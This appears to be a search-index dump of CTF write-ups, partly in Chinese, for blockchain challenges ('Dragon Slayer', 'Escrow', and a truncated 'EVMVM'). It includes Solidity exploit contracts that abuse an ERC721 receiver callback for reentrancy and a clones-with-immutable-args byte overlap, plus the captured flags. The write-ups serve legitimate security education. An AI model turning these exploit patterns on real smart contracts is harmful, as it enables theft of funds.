() == 0 ; } Dragon \u7684\u653b\u51fb\u529b\u3001\u9632\u5fa1\u529b\u4ee5\u53ca\u8840\u91cf\u90fd\u975e\u5e38\u9ad8 1 2 3 4 5 6 7 8 9 // contract Dragon constructor ( address knight_ ) { knight = knight_ ; health = 1 _000_000 ; clawAttack = 1 _000_000 ; fireAttack = 10 _000_000 ; defence = 500 _000 ; attackRound = 0 ; } \u800c Knight \u521d\u59cb\u53ea\u6709 Bronze Dagger \u548c Wooden Shield 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // contract Shop struct ItemProperties { string name ; uint price ; ItemType itemType ; uint attack ; uint defence ; bool hasAntiFire ; } constructor ( address goldCoin_ ) { goldCoin = GoldCoin ( goldCoin_ ); item = new Item (); item . mint ( address ( this ), 1 , 10 , \"\" ); items [ 1 ] = ItemProperties ( \"Bronze Dagger\" , 10 ether , ItemType . SWORD , 1 , 0 , false ); item . mint ( address ( this ), 2 , 10 , \"\" ); items [ 2 ] = ItemProperties ( \"Wooden Shield\" , 10 ether , ItemType . SHIELD , 0 , 1 , false ); item . mint ( address ( this ), 3 , 10 , \"\" ); items [ 3 ] = ItemProperties ( \"Abyssal Whip\" , 1 _000_000 ether , ItemType . SWORD , 1 _000_000 , 0 , false ); item . mint ( address ( this ), 4 , 10 , \"\" ); items [ 4 ] = ItemProperties ( \"Dragonfire Shield\" , 1 _000_000 ether , ItemType . SHIELD , 0 , 1 _000_000 , true ); // msg.sender is Knight item . mint ( msg . sender , 1 , 1 , \"\" ); item . mint ( msg . sender , 2 , 1 , \"\" ); } \u8d2d\u4e70\u5546\u54c1\u9700\u8981\u8db3\u591f\u7684 GoldCoin \uff0c\u5356\u6389\u521d\u59cb\u6301\u6709\u7684 items \u4e5f\u4e0d\u591f\u8d2d\u4e70 Abyssal Whip \u548c Dragonfire Shield \uff0c\u5e76\u4e14 Shop \u4e5f\u6ca1\u6709 GC \u652f\u4ed8 XD 1 2 3 4 5 6 7 8 9 10 // contract Shop function buyItem ( uint itemId ) external { goldCoin . transferFrom ( msg . sender , address ( this ), items [ itemId ]. price ); item . mint ( msg . sender , itemId , 1 , \"\" ); } function sellItem ( uint itemId ) external { item . burn ( msg . sender , itemId , 1 ); goldCoin . transfer ( msg . sender , items [ itemId ]. price ); // no goldCoin in shop at first } \u90a3\u4e48\uff0c\u5f97\u60f3\u529e\u6cd5\u4ece Bank \u5f04\u70b9 GC \u7528 =\u03c9= BankNote \u9075\u5faa ERC721 \u4ee3\u5e01\u6807\u51c6\uff0c\u4e14 mint() \u4e2d\u8c03\u7528\u4e86 _safeMint() 1 2 3 4 // contract BankNote function mint ( address to , uint256 tokenId ) public onlyOwner { _safeMint ( to , tokenId ); } \u63a5\u4e0b\u6765\u9700\u8981\u60f3\u529e\u6cd5\u8ba9 _safeMint() \u8c03\u7528\u8bbe\u8ba1\u597d\u7684 onERC721Received() \u3002 Bank \u4e2d deposit() \u3001 merge() \u548c split() \u4f7f\u7528\u5230\u4e86 BankNote.mint() \uff0c\u4e0d\u8fc7\u9664 Knight \u5916\uff0c\u5176\u4ed6\u5730\u5740\u5e76\u6ca1\u6709 GC \u3002\u56e0\u800c\u5728\u672a\u6301\u6709 BN \u548c GC \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u901a\u8fc7 Bank.merge() \u89e6\u53d1 BankNote.mint() \uff0c\u5176\u4e2d\u4f20\u5165\u6570\u7ec4 bankNoteIdsFrom \u7684\u957f\u5ea6\u4e3a \\(0\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 // contract Bank function deposit ( uint amount ) external { require ( amount > 0 , \"ZERO\" ); goldCoin . burn ( msg . sender , amount ); _ids . increment (); uint bankNoteId = _ids . current (); bankNote . mint ( msg . sender , bankNoteId ); bankNoteValues [ bankNoteId ] = amount ; } function merge ( uint [] memory bankNoteIdsFrom ) external { uint totalValue ; for ( uint i = 0 ; i < bankNoteIdsFrom . length ; i ++ ) { uint bankNoteId = bankNoteIdsFrom [ i ]; require ( bankNote . ownerOf ( bankNoteId ) == msg . sender , \"NOT_OWNER\" ); bankNote . burn ( bankNoteId ); totalValue += bankNoteValues [ bankNoteId ]; bankNoteValues [ bankNoteId ] = 0 ; } _ids . increment (); uint bankNoteIdTo = _ids . current (); bankNote . mint ( msg . sender , bankNoteIdTo ); bankNoteValues [ bankNoteIdTo ] += totalValue ; } function split ( uint bankNoteIdFrom , uint [] memory amounts ) external { uint totalValue ; require ( bankNote . ownerOf ( bankNoteIdFrom ) == msg . sender , \"NOT_OWNER\" ); for ( uint i = 0 ; i < amounts . length ; i ++ ) { uint value = amounts [ i ]; _ids . increment (); uint bankNoteId = _ids . current (); bankNote . mint ( msg . sender , bankNoteId ); bankNoteValues [ bankNoteId ] = value ; totalValue += value ; } require ( totalValue == bankNoteValues [ bankNoteIdFrom ], \"NOT_ENOUGH\" ); bankNote . burn ( bankNoteIdFrom ); bankNoteValues [ bankNoteIdFrom ] = 0 ; } \u91c7\u7528\u7c7b\u4f3c flashloan \u7684\u65b9\u5f0f\u4f7f\u7528 Bank.split() \uff0c\u4f7f\u7528\u5b8c\u540e deposit() \u518d\u8f6c\u79fb\u7ed9 bankNoteIdFrom \uff0c\u5c31\u80fd\u901a\u8fc7\u5224\u65ad totalValue == bankNoteValues[bankNoteIdFrom] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // contract Bank function deposit ( uint amount ) external { require ( amount > 0 , \"ZERO\" ); goldCoin . burn ( msg . sender , amount ); _ids . increment (); uint bankNoteId = _ids . current (); bankNote . mint ( msg . sender , bankNoteId ); bankNoteValues [ bankNoteId ] = amount ; } function transferPartial ( uint bankNoteIdFrom , uint amount , uint bankNoteIdTo ) external { require ( bankNote . ownerOf ( bankNoteIdFrom ) == msg . sender , \"NOT_OWNER\" ); require ( bankNoteValues [ bankNoteIdFrom ] >= amount , \"NOT_ENOUGH\" ); bankNoteValues [ bankNoteIdFrom ] -= amount ; bankNoteValues [ bankNoteIdTo ] += amount ; } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 contract Hack is IERC721Receiver { Setup setup ; Knight knight ; Bank bank ; uint visitCnt ; constructor ( address instance ) { setup = Setup ( instance ); knight = Knight ( setup . knight ()); bank = Bank ( knight . bank ()); uint [] memory emptyBankNoteIds ; bank . merge ( emptyBankNoteIds ); // deploying, onERC721Received will not be called } function exploit () external { setup . claim (); uint [] memory amounts = new uint []( 2 ); amounts [ 0 ] = 2 _000_000 ether ; amounts [ 1 ] = 0 ; bank . split ( 1 , amounts ); } function attack () internal { bank . withdraw ( 2 ); IERC20 ( knight . goldCoin ()). transfer ( address ( knight ), 2 _000_000 ether ); knight . buyItem ( 3 ); knight . buyItem ( 4 ); for ( uint i = 0 ; i < 2 ; i ++ ) knight . fightDragon (); knight . sellItem ( 3 ); knight . sellItem ( 4 ); knight . bankDeposit ( 2 _000_000 ether ); knight . bankTransferPartial ( 4 , 2 _000_000 ether , 1 ); } function onERC721Received ( address , address , uint256 tokenId , bytes calldata ) public returns ( bytes4 ) { if ( visitCnt == 1 ) { attack (); } visitCnt += 1 ; return this . onERC721Received . selector ; } } Flag \u00b6 HackTM{n0w_g0_g3t_th4t_run3_pl4t3b0dy_b4af5ff9eab4b0f7}","title":"Dragon Slayer"},{"location":"blockchain/dragon_slayer/#_1","text":"Prove yourself a true champion. Kill the mighty dragon and earn the right to call yourself a dragon slayer. nc 34.141.16.87 30100 dragon_slayer_contracts.zip","title":"\u9898\u76ee"},{"location":"blockchain/dragon_slayer/#_2","text":"\u76ee\u6807\u662f\u51fb\u8d25\u6076\u9f99w 1 2 3 4 // contract Setup function isSolved () external view returns ( bool ) { return knight . health () > 0 && knight . dragon (). health () == 0 ; } Dragon \u7684\u653b\u51fb\u529b\u3001\u9632\u5fa1\u529b\u4ee5\u53ca\u8840\u91cf\u90fd\u975e\u5e38\u9ad8 1 2 3 4 5 6 7 8 9 // contract Dragon constructor ( address knight_ ) { knight = knight_ ; health = 1 _000_000 ; clawAttack = 1 _000_000 ; fireAttack = 10 _000_000 ; defence = 500 _000 ; attackRound = 0 ; } \u800c Knight \u521d\u59cb\u53ea\u6709 Bronze Dagger \u548c Wooden Shield 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // contract Shop struct ItemProperties { string name ; uint price ; ItemType itemType ; uint attack ; uint defence ; bool hasAntiFire ; } constructor ( address goldCoin_ ) { goldCoin = GoldCoin ( goldCoin_ ); item = new Item (); item . mint ( address ( this ), 1 , 10 , \"\" ); items [ 1 ] = ItemProperties ( \"Bronze Dagger\" , 10 ether , ItemType . SWORD , 1 , 0 , false ); item . mint ( address ( this ), 2 , 10 , \"\" ); items [ 2 ] = ItemProperties ( \"Wooden Shield\" , 10 ether , ItemType . SHIELD , 0 , 1 , false ); item . mint ( address ( this ), 3 , 10 , \"\" ); items [ 3 ] = ItemProperties ( \"Abyssal Whip\" , 1 _000_000 ether , ItemType . SWORD , 1 _000_000 , 0 , false ); item . mint ( address ( this ), 4 , 10 , \"\" ); items [ 4 ] = ItemProperties ( \"Dragonfire Shield\" , 1 _000_000 ether , ItemType . SHIELD , 0 , 1 _000_000 , true ); // msg.sender is Knight item . mint ( msg . sender , 1 , 1 , \"\" ); item . mint ( msg . sender , 2 , 1 , \"\" ); } \u8d2d\u4e70\u5546\u54c1\u9700\u8981\u8db3\u591f\u7684 GoldCoin \uff0c\u5356\u6389\u521d\u59cb\u6301\u6709\u7684 items \u4e5f\u4e0d\u591f\u8d2d\u4e70 Abyssal Whip \u548c Dragonfire Shield \uff0c\u5e76\u4e14 Shop \u4e5f\u6ca1\u6709 GC \u652f\u4ed8 XD 1 2 3 4 5 6 7 8 9 10 // contract Shop function buyItem ( uint itemId ) external { goldCoin . transferFrom ( msg . sender , address ( this ), items [ itemId ]. price ); item . mint ( msg . sender , itemId , 1 , \"\" ); } function sellItem ( uint itemId ) external { item . burn ( msg . sender , itemId , 1 ); goldCoin . transfer ( msg . sender , items [ itemId ]. price ); // no goldCoin in shop at first } \u90a3\u4e48\uff0c\u5f97\u60f3\u529e\u6cd5\u4ece Bank \u5f04\u70b9 GC \u7528 =\u03c9= BankNote \u9075\u5faa ERC721 \u4ee3\u5e01\u6807\u51c6\uff0c\u4e14 mint() \u4e2d\u8c03\u7528\u4e86 _safeMint() 1 2 3 4 // contract BankNote function mint ( address to , uint256 tokenId ) public onlyOwner { _safeMint ( to , tokenId ); } \u63a5\u4e0b\u6765\u9700\u8981\u60f3\u529e\u6cd5\u8ba9 _safeMint() \u8c03\u7528\u8bbe\u8ba1\u597d\u7684 onERC721Received() \u3002 Bank \u4e2d deposit() \u3001 merge() \u548c split() \u4f7f\u7528\u5230\u4e86 BankNote.mint() \uff0c\u4e0d\u8fc7\u9664 Knight \u5916\uff0c\u5176\u4ed6\u5730\u5740\u5e76\u6ca1\u6709 GC \u3002\u56e0\u800c\u5728\u672a\u6301\u6709 BN \u548c GC \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u901a\u8fc7 Bank.merge() \u89e6\u53d1 BankNote.mint() \uff0c\u5176\u4e2d\u4f20\u5165\u6570\u7ec4 bankNoteIdsFrom \u7684\u957f\u5ea6\u4e3a \\(0\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 // contract Bank function deposit ( uint amount ) external { require ( amount > 0 , \"ZERO\" ); goldCoin . burn ( msg . sender , amount ); _ids . increment (); uint bankNoteId = _ids . current (); bankNote . mint ( msg . sender , bankNoteId ); bankNoteValues [ bankNoteId ] = amount ; } function merge ( uint [] memory bankNoteIdsFrom ) external { uint totalValue ; for ( uint i = 0 ; i < bankNoteIdsFrom . length ; i ++ ) { uint bankNoteId = bankNoteIdsFrom [ i ]; require ( bankNote . ownerOf ( bankNoteId ) == msg . sender , \"NOT_OWNER\" ); bankNote . burn ( bankNoteId ); totalValue += bankNoteValues [ bankNoteId ]; bankNoteValues [ bankNoteId ] = 0 ; } _ids . increment (); uint bankNoteIdTo = _ids . current (); bankNote . mint ( msg . sender , bankNoteIdTo ); bankNoteValues [ bankNoteIdTo ] += totalValue ; } function split ( uint bankNoteIdFrom , uint [] memory amounts ) external { uint totalValue ; require ( bankNote . ownerOf ( bankNoteIdFrom ) == msg . sender , \"NOT_OWNER\" ); for ( uint i = 0 ; i < amounts . length ; i ++ ) { uint value = amounts [ i ]; _ids . increment (); uint bankNoteId = _ids . current (); bankNote . mint ( msg . sender , bankNoteId ); bankNoteValues [ bankNoteId ] = value ; totalValue += value ; } require ( totalValue == bankNoteValues [ bankNoteIdFrom ], \"NOT_ENOUGH\" ); bankNote . burn ( bankNoteIdFrom ); bankNoteValues [ bankNoteIdFrom ] = 0 ; } \u91c7\u7528\u7c7b\u4f3c flashloan \u7684\u65b9\u5f0f\u4f7f\u7528 Bank.split() \uff0c\u4f7f\u7528\u5b8c\u540e deposit() \u518d\u8f6c\u79fb\u7ed9 bankNoteIdFrom \uff0c\u5c31\u80fd\u901a\u8fc7\u5224\u65ad totalValue == bankNoteValues[bankNoteIdFrom] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // contract Bank function deposit ( uint amount ) external { require ( amount > 0 , \"ZERO\" ); goldCoin . burn ( msg . sender , amount ); _ids . increment (); uint bankNoteId = _ids . current (); bankNote . mint ( msg . sender , bankNoteId ); bankNoteValues [ bankNoteId ] = amount ; } function transferPartial ( uint bankNoteIdFrom , uint amount , uint bankNoteIdTo ) external { require ( bankNote . ownerOf ( bankNoteIdFrom ) == msg . sender , \"NOT_OWNER\" ); require ( bankNoteValues [ bankNoteIdFrom ] >= amount , \"NOT_ENOUGH\" ); bankNoteValues [ bankNoteIdFrom ] -= amount ; bankNoteValues [ bankNoteIdTo ] += amount ; }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/dragon_slayer/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 contract Hack is IERC721Receiver { Setup setup ; Knight knight ; Bank bank ; uint visitCnt ; constructor ( address instance ) { setup = Setup ( instance ); knight = Knight ( setup . knight ()); bank = Bank ( knight . bank ()); uint [] memory emptyBankNoteIds ; bank . merge ( emptyBankNoteIds ); // deploying, onERC721Received will not be called } function exploit () external { setup . claim (); uint [] memory amounts = new uint []( 2 ); amounts [ 0 ] = 2 _000_000 ether ; amounts [ 1 ] = 0 ; bank . split ( 1 , amounts ); } function attack () internal { bank . withdraw ( 2 ); IERC20 ( knight . goldCoin ()). transfer ( address ( knight ), 2 _000_000 ether ); knight . buyItem ( 3 ); knight . buyItem ( 4 ); for ( uint i = 0 ; i < 2 ; i ++ ) knight . fightDragon (); knight . sellItem ( 3 ); knight . sellItem ( 4 ); knight . bankDeposit ( 2 _000_000 ether ); knight . bankTransferPartial ( 4 , 2 _000_000 ether , 1 ); } function onERC721Received ( address , address , uint256 tokenId , bytes calldata ) public returns ( bytes4 ) { if ( visitCnt == 1 ) { attack (); } visitCnt += 1 ; return this . onERC721Received . selector ; } }","title":"Exploit"},{"location":"blockchain/dragon_slayer/#flag","text":"HackTM{n0w_g0_g3t_th4t_run3_pl4t3b0dy_b4af5ff9eab4b0f7}","title":"Flag"},{"location":"blockchain/escrow/","tags":["smart contract","clones with immutable args"],"text":"#smart contract #clones with immutable args .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Introducing NFT-based escrows - you can deposit assets and trade escrows by selling your ownership NFT! However, I accidentally renounced ownership for my own escrow. Can you help me recover the funds? nc challs.nusgreyhats.org 30101 Challenge Files Solution \u00b6 10,000 GREY has been deposited into DualAssetEscrow , which is deployed through EscrowFactory . To withdraw GREY and solve the challenge, the caller should be the owner of EscrowFactory NFT with certain escrowId escrowId is determined by the addresses obtained from immutable arguments 1 2 3 4 5 6 7 8 9 10 function initialize () external { if ( initialized ) revert AlreadyInitialized (); ... if ( msg . data . length > 66 ) revert CalldataTooLong (); initialized = true ; ( address factory , address tokenX , address tokenY ) = _getArgs (); escrowId = uint256 ( keccak256 ( abi . encodePacked ( IDENTIFIER , factory , tokenX , tokenY ))); } EscrowFactory NFT can only be minted via the deployEscrow() function. However, the hash of arguments used in cloning will be recorded and can not be used again. We have to pass different arguments but the result of _getArgs() should remain the same as the previously deployed DualAssetEscrow to receive an NFT with the same escrowId 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function deployEscrow ( uint256 implId , bytes memory args ) external returns ( uint256 escrowId , address escrow ) { // Get the hash of the (implId, args) pair bytes32 paramsHash = keccak256 ( abi . encodePacked ( implId , args )); // If an escrow with the same (implId, args) pair exists, revert if ( deployedParams [ paramsHash ]) revert AlreadyDeployed (); // Mark the (implId, args) pair as deployed deployedParams [ paramsHash ] = true ; // Grab the implementation contract for the given implId address impl = escrowImpls [ implId ]; // Clone the implementation contract and initialize it with the given parameters. escrow = impl . clone ( abi . encodePacked ( address ( this ), args )); IEscrow ( escrow ). initialize (); // Get the ID for the deployed escrow escrowId = IEscrow ( escrow ). escrowId (); // Mint an ERC721 token to represent ownership of the escrow _mint ( msg . sender , escrowId ); } We can not simply adding extra bytes to args due to the calldata length check in DualAssetEscrow::initialize() . Although adding extra bytes can make runSize exceed 65535 bytes and deploy a contract with the expected arguments, the transaction will revert with an out of gas error When the ClonesWithImmutableArgs proxy is called, the immutable arguments and a 2-byte length field will be appended to the calldata of the delegate call to the implementation contract. The argument is read based on the starting offset and its type 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /// @notice Reads an immutable arg with type address /// @param argOffset The offset of the arg in the packed data /// @return arg The arg value function _getArgAddress ( uint256 argOffset ) internal pure returns ( address arg ) { uint256 offset = _getImmutableArgsOffset (); // solhint-disable-next-line no-inline-assembly assembly { arg := shr ( 0x60 , calldataload ( add ( offset , argOffset ))) } } Since tokenY is address(0) and the first byte of the length field is unused, the first byte of the length field can be utilized as the last byte of the tokenY , thus reducing the args passed to deployEscrow() by one byte, resulting in a different paramsHash 1 2 3 4 5 // Deploy a DualAssetEscrow ( escrowId , escrow ) = factory . deployEscrow ( 0 , // implId = 0 abi . encodePacked ( address ( grey ), address ( 0 )) // tokenX = GREY, tokenY = ETH ); Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 contract Solve is Script { function run () public { Setup setup = Setup ( vm . envAddress ( \"INSTANCE\" )); EscrowFactory factory = setup . factory (); address grey = address ( setup . grey ()); address escrow = setup . escrow (); vm . startBroadcast ( vm . envUint ( \"PRIV\" )); factory . deployEscrow ( 0 , // implId abi . encodePacked ( grey , new bytes ( 19 ) ) ); DualAssetEscrow ( escrow ). withdraw ( true , 10 _000e18 ); require ( setup . isSolved ()); vm . stopBroadcast (); } } Flag \u00b6 grey{cwia_bytes_overlap_5a392abcfa2d040a}","title":"Escrow"},{"location":"blockchain/escrow/#description","text":"Introducing NFT-based escrows - you can deposit assets and trade escrows by selling your ownership NFT! However, I accidentally renounced ownership for my own escrow. Can you help me recover the funds? nc challs.nusgreyhats.org 30101 Challenge Files","title":"Description"},{"location":"blockchain/escrow/#solution","text":"10,000 GREY has been deposited into DualAssetEscrow , which is deployed through EscrowFactory . To withdraw GREY and solve the challenge, the caller should be the owner of EscrowFactory NFT with certain escrowId escrowId is determined by the addresses obtained from immutable arguments 1 2 3 4 5 6 7 8 9 10 function initialize () external { if ( initialized ) revert AlreadyInitialized (); ... if ( msg . data . length > 66 ) revert CalldataTooLong (); initialized = true ; ( address factory , address tokenX , address tokenY ) = _getArgs (); escrowId = uint256 ( keccak256 ( abi . encodePacked ( IDENTIFIER , factory , tokenX , tokenY ))); } EscrowFactory NFT can only be minted via the deployEscrow() function. However, the hash of arguments used in cloning will be recorded and can not be used again. We have to pass different arguments but the result of _getArgs() should remain the same as the previously deployed DualAssetEscrow to receive an NFT with the same escrowId 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function deployEscrow ( uint256 implId , bytes memory args ) external returns ( uint256 escrowId , address escrow ) { // Get the hash of the (implId, args) pair bytes32 paramsHash = keccak256 ( abi . encodePacked ( implId , args )); // If an escrow with the same (implId, args) pair exists, revert if ( deployedParams [ paramsHash ]) revert AlreadyDeployed (); // Mark the (implId, args) pair as deployed deployedParams [ paramsHash ] = true ; // Grab the implementation contract for the given implId address impl = escrowImpls [ implId ]; // Clone the implementation contract and initialize it with the given parameters. escrow = impl . clone ( abi . encodePacked ( address ( this ), args )); IEscrow ( escrow ). initialize (); // Get the ID for the deployed escrow escrowId = IEscrow ( escrow ). escrowId (); // Mint an ERC721 token to represent ownership of the escrow _mint ( msg . sender , escrowId ); } We can not simply adding extra bytes to args due to the calldata length check in DualAssetEscrow::initialize() . Although adding extra bytes can make runSize exceed 65535 bytes and deploy a contract with the expected arguments, the transaction will revert with an out of gas error When the ClonesWithImmutableArgs proxy is called, the immutable arguments and a 2-byte length field will be appended to the calldata of the delegate call to the implementation contract. The argument is read based on the starting offset and its type 1 2 3 4 5 6 7 8 9 10 11 12 13 14 /// @notice Reads an immutable arg with type address /// @param argOffset The offset of the arg in the packed data /// @return arg The arg value function _getArgAddress ( uint256 argOffset ) internal pure returns ( address arg ) { uint256 offset = _getImmutableArgsOffset (); // solhint-disable-next-line no-inline-assembly assembly { arg := shr ( 0x60 , calldataload ( add ( offset , argOffset ))) } } Since tokenY is address(0) and the first byte of the length field is unused, the first byte of the length field can be utilized as the last byte of the tokenY , thus reducing the args passed to deployEscrow() by one byte, resulting in a different paramsHash 1 2 3 4 5 // Deploy a DualAssetEscrow ( escrowId , escrow ) = factory . deployEscrow ( 0 , // implId = 0 abi . encodePacked ( address ( grey ), address ( 0 )) // tokenX = GREY, tokenY = ETH );","title":"Solution"},{"location":"blockchain/escrow/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 contract Solve is Script { function run () public { Setup setup = Setup ( vm . envAddress ( \"INSTANCE\" )); EscrowFactory factory = setup . factory (); address grey = address ( setup . grey ()); address escrow = setup . escrow (); vm . startBroadcast ( vm . envUint ( \"PRIV\" )); factory . deployEscrow ( 0 , // implId abi . encodePacked ( grey , new bytes ( 19 ) ) ); DualAssetEscrow ( escrow ). withdraw ( true , 10 _000e18 ); require ( setup . isSolved ()); vm . stopBroadcast (); } }","title":"Exploitation"},{"location":"blockchain/escrow/#flag","text":"grey{cwia_bytes_overlap_5a392abcfa2d040a}","title":"Flag"},{"location":"blockchain/evmvm/","tags":["smart contract","evm","assembly","yul"],"text":"#smart contract #evm #assembly #yul .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 All these zoomers with their \"metaverse\" or something are thinking far too primitive. If the red pill goes down the rabbit hole, then how far up can we go? nc lac.tf 31151 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.18 ; import \"./EVMVM.sol\" ; contract Setup { EVMVM public immutable metametaverse = new EVMVM (); bool private solved = false ; function solve () external { assert ( msg . sender == address ( metametaverse )); solved = true ; } function isSolved () external view returns ( bool ) { return solved ; } } EVMVM.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.18 ; // YES I FINALLY GOT MY METAMETAVERSE TO WORK - Arc'blroth contract EVMVM { uint [] private stack ; // executes a single opcode on the metametaverse\u2122 // TODO(arc) implement the last few opcodes function enterTheMetametaverse ( bytes32 opcode , bytes32 arg ) external { assembly { // declare yul bindings for the stack // apparently you can only call yul functions from yul :sob: // https://ethereum.stackexchange.com/questions/126609/calling-functions-using-inline-assembly-yul function spush ( data ) { let index := sload ( 0x00 ) let stackSlot := 0x00 sstore ( add ( keccak256 ( stackSlot , 0x20 ), index ), data ) sstore ( 0x00 , add ( index , 1 )) } function spop () -> out { let index := sub ( sload ( 0x00 ), 1 ) let stackSlot := 0x00 out := sload ( add ( keccak256 ( stackSlot , 0x20 ), index )) sstore ( add ( keccak256 ( stackSlot , 0x20 ), index ), 0 ) // zero out the popped memory sstore ( 0x00 , index ) } // opcode reference: https://www.evm.codes/?fork=merge switch opcode case 0x00 { // STOP // lmfao you literally just wasted gas } case 0x01 { // ADD spush ( add ( spop (), spop ())) } case 0x02 { // MUL spush ( mul ( spop (), spop ())) } case 0x03 { // SUB spush ( sub ( spop (), spop ())) } case 0x04 { // DIV spush ( div ( spop (), spop ())) } case 0x05 { // SDIV spush ( sdiv ( spop (), spop ())) } case 0x06 { // MOD spush ( mod ( spop (), spop ())) } case 0x07 { // SMOD spush ( smod ( spop (), spop ())) } case 0x08 { // ADDMOD spush ( addmod ( spop (), spop (), spop ())) } case 0x09 { // MULMOD spush ( mulmod ( spop (), spop (), spop ())) } case 0x0A { // EXP spush ( exp ( spop (), spop ())) } case 0x0B { // SIGNEXTEND spush ( signextend ( spop (), spop ())) } case 0x10 { // LT spush ( lt ( spop (), spop ())) } case 0x11 { // GT spush ( gt ( spop (), spop ())) } case 0x12 { // SLT spush ( slt ( spop (), spop ())) } case 0x13 { // SGT spush ( sgt ( spop (), spop ())) } case 0x14 { // EQ spush ( eq ( spop (), spop ())) } case 0x15 { // ISZERO spush ( iszero ( spop ())) } case 0x16 { // AND spush ( and ( spop (), spop ())) } case 0x17 { // OR spush ( or ( spop (), spop ())) } case 0x18 { // XOR spush ( xor ( spop (), spop ())) } case 0x19 { // NOT spush ( not ( spop ())) } case 0x1A { // BYTE spush ( byte ( spop (), spop ())) } case 0x1B { // SHL spush ( shl ( spop (), spop ())) } case 0x1C { // SHR spush ( shr ( spop (), spop ())) } case 0x1D { // SAR spush ( sar ( spop (), spop ())) } case 0x20 { // SHA3 spush ( keccak256 ( spop (), spop ())) } case 0x30 { // ADDRESS spush ( address ()) } case 0x31 { // BALANCE spush ( balance ( spop ())) } case 0x32 { // ORIGIN spush ( origin ()) } case 0x33 { // CALLER spush ( caller ()) } case 0x34 { // CALLVALUE spush ( callvalue ()) } case 0x35 { // CALLDATALOAD spush ( calldataload ( spop ())) } case 0x36 { // CALLDATASIZE spush ( calldatasize ()) } case 0x37 { // CALLDATACOPY calldatacopy ( spop (), spop (), spop ()) } case 0x38 { // CODESIZE spush ( codesize ()) } case 0x3A { // GASPRICE spush ( gasprice ()) } case 0x3B { // EXTCODESIZE spush ( extcodesize ( spop ())) } case 0x3C { // EXTCODECOPY extcodecopy ( spop (), spop (), spop (), spop ()) } case 0x3D { // RETURNDATASIZE spush ( returndatasize ()) } case 0x3E { // RETURNDATACOPY returndatacopy ( spop (), spop (), spop ()) } case 0x3F { // EXTCODEHASH spush ( extcodehash ( spop ())) } case 0x40 { // BLOCKHASH spush ( blockhash ( spop ())) } case 0x41 { // COINBASE (sponsored opcode) spush ( coinbase ()) } case 0x42 { // TIMESTAMP spush ( timestamp ()) } case 0x43 { // NUMBER spush ( number ()) } case 0x44 { // PREVRANDAO // spush(difficulty()) spush ( prevrandao ()) // (1) } case 0x45 { // GASLIMIT spush ( gaslimit ()) } case 0x46 { // CHAINID spush ( chainid ()) } case 0x47 { // SELBALANCE spush ( selfbalance ()) } case 0x48 { // BASEFEE spush ( basefee ()) } case 0x50 { // POP pop ( spop ()) } case 0x51 { // MLOAD spush ( mload ( spop ())) } case 0x52 { // MSTORE mstore ( spop (), spop ()) } case 0x53 { // MSTORE8 mstore8 ( spop (), spop ()) } case 0x54 { // SLOAD spush ( sload ( spop ())) } case 0x55 { // SSTORE sstore ( spop (), spop ()) } case 0x59 { // MSIZE spush ( msize ()) } case 0x5A { // GAS spush ( gas ()) 